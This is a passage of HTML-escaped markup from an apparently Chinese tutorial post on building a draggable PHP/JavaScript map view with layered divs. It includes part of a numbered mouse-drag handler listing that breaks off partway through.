style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;div&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;left&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;top&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;就行了。（&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;left&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;和&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;top&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;就是小图块相对于大图块的绝对坐标）&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;showMap(x,y)&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;就放在下面两个层的里面。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:10.5pt;font-family:tahoma;color:black;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;mso-bidi-font-size:10.5pt;font-family:宋体;mso-bidi-font-family:tahoma;color:black;&quot;&gt;一个层处理地图大小：&lt;span lang=&quot;EN-US&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:whitesmoke;word-break:break-all;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;1&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;lt;div&amp;nbsp;style=\\&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:maroon;&quot;&gt;&quot;position:relative;width:&quot;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;.$mapwidth.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:maroon;&quot;&gt;&quot;px;height:&quot;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;.$mapheight.&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:maroon;&quot;&gt;&quot;px;overflow:hidden\\&quot;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;margin-top:3.75pt;margin-right:0cm;margin-bottom:3.75pt;margin-left:0cm;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:white;&quot;&gt;&lt;span style=&quot;mso-bidi-font-size:9.0pt;font-family:宋体;mso-ascii-font-family:tahoma;mso-hansi-font-family:tahoma;mso-bidi-font-family:tahoma;color:black;&quot;&gt;一个层处理拖动：&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;mso-bidi-font-size:9.0pt;font-family:tahoma;color:black;&quot;&gt;&lt;o :p&gt;&lt;/o :p&gt;&lt;/span&gt;&lt;/p&gt;\r\n&lt;p class=&quot;MsoNormal&quot; align=&quot;left&quot; style=&quot;text-align:left;line-height:21.6pt;mso-pagination:widow-orphan;background:whitesmoke;word-break:break-all;&quot;&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;1&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;lt;div&amp;nbsp;style=\\&quot;position:absolute;z-index:10;left:2px;top:2px;width:&quot;.$mapwidth.&quot;px;height:&quot;.$mapheight.&quot;px;\\&quot;&amp;nbsp;onmousedown=\\&quot;fDragging(this,&amp;nbsp;event,false);\\&quot;&amp;gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;2&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;3&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;//&lt;/span&gt;&lt;span style=&quot;font-size:10.0pt;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;处理拖动的&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;js&lt;/span&gt;&lt;span style=&quot;font-size:10.0pt;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;代码。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;font-size:10.0pt;font-family:宋体;mso-ascii-font-family:&amp;quot;Couriernew&amp;quot;;mso-hansi-font-family:&amp;quot;Couriernew&amp;quot;;mso-bidi-font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;网上抄的。。感谢这位大大。&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:green;&quot;&gt;)&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;4&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;lt;script&amp;gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;5&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;function&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;fDragging(obj,&amp;nbsp;e,&amp;nbsp;limit){&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;6&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(!e)&amp;nbsp;e=window.event;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;7&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;x=parseInt(obj.style.left);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;8&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;y=parseInt(obj.style.top);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;&amp;nbsp;9&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;10&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;x_=e.clientX-x;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;11&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;y_=e.clientY-y;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;12&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;13&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(document.addEventListener){&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;14&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.addEventListener(''mousemove'',&amp;nbsp;inFmove,&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;true&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;15&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.addEventListener(''mouseup'',&amp;nbsp;inFup,&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;true&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;16&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.body.style.cursor=&quot;move&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;17&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;else&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(document.attachEvent){&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;18&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.attachEvent(''onmousemove'',&amp;nbsp;inFmove);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;19&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.attachEvent(''onmouseup'',&amp;nbsp;inFup);&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;20&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;document.body.style.cursor=&quot;move&quot;;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;21&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;}&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;22&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;23&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;inFstop(e);&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;24&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;inFabort(e)&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;25&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;26&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;function&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;inFmove(e){&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;27&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;28&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;var&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;evt;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;29&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(!e)e=window.event;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;30&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;31&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:blue;&quot;&gt;if&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:black;&quot;&gt;(limit){&amp;nbsp;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; style=&quot;font-size:10.0pt;font-family:&amp;quot;Couriernew&amp;quot;;color:teal;&quot;&gt;32&lt;/span&gt;&lt;span lang=&quot;EN-US&quot; 